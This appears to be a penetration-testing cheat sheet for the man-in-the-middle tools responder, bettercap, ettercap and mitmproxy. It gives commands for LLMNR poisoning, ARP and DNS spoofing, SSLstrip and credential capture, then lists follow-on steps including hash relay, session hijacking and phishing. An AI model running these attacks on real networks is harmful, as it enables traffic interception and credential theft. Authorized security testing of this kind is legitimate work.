# MITM Tools — Network Interception

> Covers: bettercap, ettercap, mitmproxy, responder

## Why
Intercept, modify, and analyze network traffic. Capture credentials, session tokens, NTLM hashes. Active network attacks.

## Risk Level: HIGH — Network disruption possible

---

## responder — LLMNR/NBT-NS/mDNS Poisoner

### When to Use
| Signal | Action |
|---|---|
| Internal network access | Passive hash capture |
| Windows environment | LLMNR/NBT-NS poisoning |
| Need NTLM hashes | Start responder, wait |

### Common Invocations
```bash
# Basic (listen and poison)
responder -I <interface>

# Analyze mode (passive, no poisoning)
responder -I <interface> -A

# With WPAD proxy
responder -I <interface> -wrf
```

### Key Output
- **NTLMv2 hashes** → crack with hashcat -m 5600
- **Cleartext creds** → direct use
- **Challenge/response pairs** → relay attacks

---

## bettercap — Network Attack Framework

### When to Use
| Signal | Action |
|---|---|
| ARP spoofing needed | MITM traffic |
| Need to sniff creds | HTTP/FTP/etc interception |
| WiFi attacks | Deauth, handshake capture |
| DNS spoofing | Redirect traffic |

### Common Invocations
```bash
# Start interactive
bettercap -iface <interface>

# ARP spoof + sniff
> net.probe on
> set arp.spoof.targets <target_ip>
> arp.spoof on
> net.sniff on

# DNS spoof
> set dns.spoof.domains <domain>
> set dns.spoof.address <your_ip>
> dns.spoof on

# HTTPS downgrade (SSLstrip)
> set http.proxy.sslstrip true
> http.proxy on
```

---

## ettercap — ARP Poisoning & Sniffing

### Common Invocations
```bash
# Text mode ARP MITM
ettercap -T -q -i <interface> -M arp:remote /<target1>// /<gateway>//

# Graphical mode
ettercap -G

# Sniff only (no MITM)
ettercap -T -q -i <interface>
```

---

## mitmproxy — HTTP/HTTPS Proxy

### When to Use
| Signal | Action |
|---|---|
| Need to inspect HTTP traffic | Detailed request/response analysis |
| Need to modify requests | Parameter tampering |
| Need to replay requests | Testing modifications |

### Common Invocations
```bash
# Start proxy (default port 8080)
mitmproxy

# Transparent proxy mode
mitmproxy --mode transparent

# Dump mode (non-interactive)
mitmdump -w traffic.log

# With script
mitmproxy -s modify_requests.py
```

---

## Junior Mistakes (all MITM tools)

- Running MITM outside authorized scope (legal issues)
- ARP spoofing entire subnet (network disruption)
- Not understanding the network topology first
- Forgetting to restore ARP tables after attack
- Running responder in poisoning mode without understanding impact

## Pivot After MITM

```
NTLM hash captured?     → hashcat -m 5600 or relay attack
Cleartext creds?         → try on all services
Session token captured?  → session hijacking
HTTP traffic captured?   → analyze for sensitive data, APIs
DNS spoofing worked?     → serve phishing page or exploit
```
